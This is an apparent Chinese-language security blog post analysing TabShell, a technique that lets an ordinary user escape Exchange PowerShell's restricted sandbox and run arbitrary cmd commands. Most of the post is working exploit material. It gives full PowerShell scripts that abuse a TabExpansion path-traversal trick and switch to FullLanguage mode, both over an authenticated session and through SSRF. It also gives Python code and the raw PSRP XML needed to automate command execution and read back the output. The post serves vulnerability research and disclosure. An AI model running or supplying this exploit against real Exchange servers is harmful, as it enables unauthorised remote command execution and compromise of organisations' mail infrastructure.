---
layout: post
title: TabShell利用分析——执行cmd命令并获得返回结果
---


## 0x00 前言
---

利用TabShell可以使用普通用户逃避沙箱并在Exchange Powershell中执行任意cmd命令，本文将要介绍利用TabShell执行cmd命令并获得返回结果的方法，分享通过Python编写脚本的细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 执行cmd命令并获得返回结果的方法
- Python实现

## 0x02 执行cmd命令并获得返回结果的方法
---

testanull公开了一个利用的POC，地址如下：https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e

为了能够支持更多的命令，POC需要做简单修改，细节如下：

某些命令无法执行，例如`netstat -ano`或者`systeminfo`

解决方法：

去掉命令：`$ps.WaitForExit()`

执行cmd命令并获得返回结果的方法有以下两种：

### 1.使用Powershell连接Exchange服务器，实现TabShell

Powershell命令示例：

```
$uri = "http://Exchange01.test.com/PowerShell/"
$username = "test\administrator"
$password = "Password123"

$secure = ConvertTo-SecureString $password -AsPlainText -Force 
$creds  = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $secure)
$version = New-Object -TypeName System.Version -ArgumentList "2.0"
$mytable = $PSversionTable
$mytable["WSManStackVersion"] = $version
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSversionTable=$mytable}
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $uri -Credential $creds -Authentication Kerberos -AllowRedirection -SessionOption $sessionOption
Invoke-Command -Session $session -ScriptBlock { 
    TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" 
}
invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'"
$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "ipconfig"
$ps.StartInfo.Arguments = " /all"
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
[string] $Out = $ps.StandardOutput.ReadToEnd();
$Out
```

需要注意以下问题：

- 需要域内主机上执行
- 需要fqdn，不支持IP
- 连接url可以选择`http`或`https`
- 认证方式可以选择`Basic`或`Kerberos`

### 2.通过SSRF漏洞调用Exchange Powershell，实现TabShell

这里需要通过Flask建立本地代理服务器，方法可参考之前的文章[《ProxyShell利用分析3——添加用户和文件写入》](https://3gstudent.github.io/ProxyShell%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%903-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%92%8C%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5)

Powershell命令示例：

```
$uri = "http://127.0.0.1:80/PowerShell/" 
$username = "whatever"
$password = "whatever"
 
$secure = ConvertTo-SecureString $password -AsPlainText -Force 
$creds  = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $secure)
$version = New-Object -TypeName System.Version -ArgumentList "2.0"
$mytable = $PSversionTable
$mytable["WSManStackVersion"] = $version
$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSversionTable=$mytable}
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSversionTable=$mytable}
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $uri -Credential $creds -Authentication Kerberos -AllowRedirection -SessionOption $sessionOption
Invoke-Command -Session $session -ScriptBlock { 
    TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" 
}
invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'"
$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "ipconfig"
$ps.StartInfo.Arguments = " /all"
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
[string] $Out = $ps.StandardOutput.ReadToEnd();
$Out
```

## 0x03 Python实现
---

这里需要考虑两部分，一种是通过SSRF漏洞调用Exchange Powershell实现TabShell的Python实现，另一种是通过Powershell Session实现TabShell的Python实现，后者比前者需要额外考虑通信数据的编码和解码，具体细节如下：

## 1.通过SSRF漏洞调用Exchange Powershell实现TabShell的Python实现

为了分析中间的通信数据，抓取明文数据的方法可参考上一篇文章《渗透技巧——Exchange Powershell的Python实现》中的0x04，在Flask中输出中间的通信数据

关键代码示例：

```
while True:
    r = session.post(powershell_url, data=data, headers=req_headers, verify=False)
    print("post data:")
    print(data)
    
    if r.status_code == 200:
        print("[+]" + r.headers["X-CalculatedBETarget"])
        break
    else:    
        print("[-]" + r.headers["X-CalculatedBETarget"])

print("recv data:")
print(r.content)
```

通过分析中间的通信数据，我们可以总结出以下通信过程：

#### (1)creationXml

初始化，构造原始数据

#### (2)ReceiveData

循环多次执行，返回结果中包含`"RunspaceState"`作为结束符

#### (3)执行命令`;../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression`

在返回数据中获得CommandId

#### (4)读取输出结果

通过CommandId读取命令执行结果

#### (5)执行命令`$ExecutionContext.SessionState.LanguageMode='FullLanguage'`

在返回数据中获得CommandId

#### (6)读取输出结果

通过CommandId读取命令执行结果

#### (7)执行命令并获得返回结果

依次执行以下命令：

```
ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "ipconfig"
$ps.StartInfo.Arguments = " /all"
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
[string] $Out = $ps.StandardOutput.ReadToEnd();
```

在返回数据中获得CommandId，并通过CommandId读取命令执行结果，这些命令的格式相同，发送数据的格式如下：

```
"""<Obj RefId="0">
    <MS>
        <Obj N="PowerShell" RefId="1">
            <MS>
                <Obj N="Cmds" RefId="2">
                    <TN RefId="0">
                        <T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T>
                        <T>System.Object</T>
                    </TN>
                    <LST>
                        <Obj RefId="3">
                            <MS>
                                <S N="Cmd">{command}</S>
                                <B N="IsScript">true</B>
                                <Nil N="UseLocalScope" />
                                <Obj N="MergeMyResult" RefId="4">
                                    <TN RefId="1">
                                        <T>System.Management.Automation.Runspaces.PipelineResultTypes</T>
                                        <T>System.Enum</T>
                                        <T>System.ValueType</T>
                                        <T>System.Object</T>
                                    </TN>
                                    <ToString>Error</ToString>
                                    <I32>2</I32>
                                </Obj>
                                <Obj N="MergeToResult" RefId="5">
                                    <TNRef RefId="1" />
                                    <ToString>Output</ToString>
                                    <I32>1</I32>
                                </Obj>
                                <Obj N="MergePreviousResults" RefId="6">
                                    <TNRef RefId="1" />
                                    <ToString>None</ToString>
                                    <I32>0</I32>
                                </Obj>
                                <Obj N="Args" RefId="7">
                                    <TNRef RefId="0" />
                                    <LST />
                                </Obj>
                            </MS>
                        </Obj>
                        <Obj RefId="8">
                            <MS>
                                <S N="Cmd">Out-Default</S>
                                <B N="IsScript">false</B>
                                <B N="UseLocalScope">true</B>
                                <Obj N="MergeMyResult" RefId="9">
                                    <TNRef RefId="1" />
                                    <ToString>None</ToString>
                                    <I32>0</I32>
                                </Obj>
                                <Obj N="MergeToResult" RefId="10">
                                    <TNRef RefId="1" />
                                    <ToString>None</ToString>
                                    <I32>0</I32>
                                </Obj>
                                <Obj N="MergePreviousResults" RefId="11">
                                    <TNRef RefId="1" />
                                    <ToString>Output, Error</ToString>
                                    <I32>3</I32>
                                </Obj>
                                <Obj N="Args" RefId="12">
                                    <TNRef RefId="0" />
                                    <LST />
                                </Obj>
                            </MS>
                        </Obj>
                    </LST>
                </Obj>
                <B N="IsNested">false</B>
                <S N="History">{command}</S>
                <B N="RedirectShellErrorOutputPipe">false</B>
            </MS>
        </Obj>
        <B N="NoInput">true</B>
        <Obj N="ApartmentState" RefId="13">
            <TN RefId="2">
                <T>System.Threading.ApartmentState</T>
                <T>System.Enum</T>
                <T>System.ValueType</T>
                <T>System.Object</T>
            </TN>
            <ToString>Unknown</ToString>
            <I32>2</I32>
        </Obj>
        <Obj N="RemoteStreamOptions" RefId="14">
            <TN RefId="3">
                <T>System.Management.Automation.RemoteStreamOptions</T>
                <T>System.Enum</T>
                <T>System.ValueType</T>
                <T>System.Object</T>
            </TN>
            <ToString>0</ToString>
            <I32>0</I32>
        </Obj>
        <B N="AddToHistory">true</B>
        <Obj N="HostInfo" RefId="15">
            <MS>
                <B N="_isHostNull">true</B>
                <B N="_isHostUINull">true</B>
                <B N="_isHostRawUINull">true</B>
                <B N="_useRunspaceHost">true</B>
            </MS>
        </Obj>
    </MS>
</Obj>"""
```

#### (8)执行命令并获得最终返回结果

发送数据的格式同(7)一致，执行的命令为： `$Out`，在返回数据中获得CommandId，并通过CommandId读取最终的命令执行结果，提取执行结果的示例代码：

```
doc = xml.dom.minidom.parseString(response_text)
elements = doc.getElementsByTagName("rsp:Stream")
if len(elements) == 0:
    print("[-] GetCommandoutput failed with no Stream return")
    sys.exit(0)

print("[+] Output: ")
for element_i in elements:
    data = element_i.firstChild.nodeValue
    rawdata = base64.b64decode(data).decode('ISO-8859-1')        
    try:                
        pattern_output = re.compile(r"<S>(.*?)</S>")
        output_data = pattern_output.findall(rawdata)       
        print(output_data[0])       
    except Exception as e:
        return
```

### 2.通过Powershell Session实现TabShell的Python实现

这里可以借鉴上一篇文章《渗透技巧——Exchange Powershell的Python实现》得出的经验：两者通信过程一致，只是通过Powershell Session实现TabShell的Python实现需要额外考虑通信数据的编码和解码

通信数据的编码和解码可参考上一篇文章《渗透技巧——Exchange Powershell的Python实现》中的0x03

数据的编码和解码示例代码如下：

```
from pypsrp.encryption import WinRMEncryption
from pypsrp._utils import get_hostname, to_string, to_unicode
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
    'Content-Type': 'multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"',
    'Accept-Encoding': 'identity'
}
print("[*] 1.Sending http request")
r = session.post(url, data=request_data, headers=headers, verify=False)
if r.status_code == 200:
    print("[+] Success")
else:
    print("[!]")
    print(r.status_code)
    print(r.text)
    sys.exit(0)
 
hostname = "exchange01.test.com"
protocol = WinRMEncryption.KERBEROS
encryption = WinRMEncryption(session.auth.contexts[hostname], protocol)
content_type, payload = encryption.wrap_message(request_data.encode('utf-8'))

print("[*] 2.Sending http request")

r = session.post(url, data=payload, headers=headers, verify=False)
if r.status_code == 200:
    print("[+] Response length: " + str(len(r.text)))
    boundary = re.search("boundary=[" '|\\"](.*)[' '|\\"]', r.headers["content-type"]).group(1)  # type: ignore[union-attr] # This should not happen
    response_content = encryption.unwrap_message(r.content, to_unicode(boundary))  # type: ignore[union-attr] # This should not happen
    response_text = to_string(response_content)
```

完整代码的输出结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2023-1-10/2-1.png)

## 0x04 小结
---

本文介绍了利用TabShell执行cmd命令并获得返回结果的方法，改进POC，分享通过Python编写脚本的细节。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


